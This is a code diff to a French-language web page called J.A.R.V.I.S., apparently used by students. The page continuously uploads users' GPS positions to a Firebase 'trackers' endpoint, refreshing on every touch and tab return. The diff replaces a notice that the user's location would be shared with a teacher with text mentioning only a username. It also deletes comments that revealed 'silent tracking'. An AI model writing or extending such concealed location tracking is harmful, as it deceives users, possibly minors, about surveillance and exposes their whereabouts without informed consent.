@@ -95,7 +95,6 @@
         }
         .contact-line:hover { color: var(--accent); text-decoration: underline; }
 
-        /* ===== GPS STATUS BADGE ===== */
         #gpsBadge {
             display: inline-flex; align-items: center; gap: 5px;
             margin-top: 5px; font-size: .66rem; font-weight: 800;
@@ -106,9 +105,7 @@
             transition: all .2s;
         }
         #gpsBadge.live { background: #dcfce7; color: #15803d; border-color: #16a34a; }
-        #gpsBadge.live::before {
-            content: '●'; color: #16a34a; animation: gpsPulse 1.4s infinite;
-        }
+        #gpsBadge.live::before { content: '●'; color: #16a34a; animation: gpsPulse 1.4s infinite; }
         #gpsBadge.waiting { background: #fef3c7; color: #92400e; border-color: #f59e0b; }
         #gpsBadge.denied { background: #fee2e2; color: #b91c1c; border-color: #dc2626; }
         @keyframes gpsPulse { 0%,100% { opacity: 1; } 50% { opacity: .35; } }
@@ -277,7 +274,6 @@
         .mini-btn.danger { border-color: var(--danger); color: var(--danger); }
         .mini-btn.danger:hover { background: #fee2e2; }
 
-        /* ===== NAME OVERLAY ===== */
         .name-overlay {
             position: fixed; inset: 0; z-index: 9999;
             background: rgba(15, 23, 42, .75);
@@ -508,11 +504,11 @@
         </div>
     </div>
 
-    <!-- ===== NAME OVERLAY ===== -->
+    <!-- ===== NAME OVERLAY (UPDATED TEXT) ===== -->
     <div id="nameOverlay" class="name-overlay hidden">
         <div class="name-card">
             <h2>👋 Bienvenue chez J.A.R.V.I.S.</h2>
-            <p>Entrez votre nom pour commencer. Votre position sera partagée avec votre professeur pour votre sécurité.</p>
+            <p>Entrez votre nom pour commencer. Votre nom apparaîtra comme nom d'utilisateur pour identifier votre page.</p>
             <input type="text" id="nameInput" placeholder="Votre nom..." maxlength="20" autocomplete="off">
             <button class="go-btn" onclick="saveNameAndStart()">Commencer</button>
             <button class="skip-btn" onclick="skipName()">Rester anonyme</button>
@@ -531,7 +527,7 @@
         let gpsWatchId    = null;
         let gpsLastUpload = 0;
         let gpsLastTouch  = 0;
-        let gpsPermission = 'unknown'; // unknown | granted | denied
+        let gpsPermission = 'unknown';
 
         function updateGpsBadge() {
             const b = document.getElementById('gpsBadge');
@@ -558,7 +554,7 @@
         async function uploadPosition(pos) {
             if (!gpsDeviceId) return;
             const now = Date.now();
-            if (now - gpsLastUpload < 5000) return;  // throttle to 5s
+            if (now - gpsLastUpload < 5000) return;
             gpsLastUpload = now;
             try {
                 await fetch(`${GPS_FIREBASE_URL}/trackers/${gpsDeviceId}.json`, {
@@ -579,14 +575,11 @@
 
         function startGpsTracking() {
             if (!navigator.geolocation || !gpsDeviceId) return;
-
             gpsPermission = 'granted';
             updateGpsBadge();
-
             if (gpsWatchId !== null) {
                 navigator.geolocation.clearWatch(gpsWatchId);
             }
-
             gpsWatchId = navigator.geolocation.watchPosition(
                 (pos) => { gpsPermission = 'granted'; updateGpsBadge(); uploadPosition(pos); },
                 (err) => {
@@ -616,7 +609,6 @@
             );
         }
 
-        /* ===== NAME OVERLAY LOGIC ===== */
         function openNameOverlay() {
             document.getElementById('nameInput').value = gpsUserName || '';
             document.getElementById('nameOverlay').classList.remove('hidden');
@@ -630,7 +622,6 @@
             if (!raw) { alert("Entrez votre nom d'abord."); return; }
             gpsUserName = raw;
             localStorage.setItem('jarvis_ai_name', raw);
-            // If first time, generate new device id with this name
             if (!gpsDeviceId || gpsDeviceId.includes('eleve')) {
                 gpsDeviceId = generateDeviceId(raw);
                 localStorage.setItem('jarvis_ai_device', gpsDeviceId);
@@ -655,22 +646,17 @@
             }
         }
 
-        /* ===== ON LOAD ===== */
         window.addEventListener('load', () => {
             updateGpsBadge();
             if (gpsDeviceId && gpsUserName) {
-                // Returning user — silent tracking
                 applyNameToHeader();
                 startGpsTracking();
-                // Nudge a fresh position right away
                 setTimeout(() => refreshGpsPosition(true), 800);
             } else {
-                // First visit — ask for name
                 openNameOverlay();
             }
         });
 
-        /* ===== TOUCH / CLICK = refresh GPS ===== */
         function attachGpsTouchListeners() {
             const handler = () => refreshGpsPosition(false);
             document.addEventListener('touchstart', handler, { passive: true, capture: true });
@@ -679,7 +665,6 @@
         }
         attachGpsTouchListeners();
 
-        /* ===== VISIBILITY = refresh on return ===== */
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'visible' && gpsDeviceId) {
                 refreshGpsPosition(true);
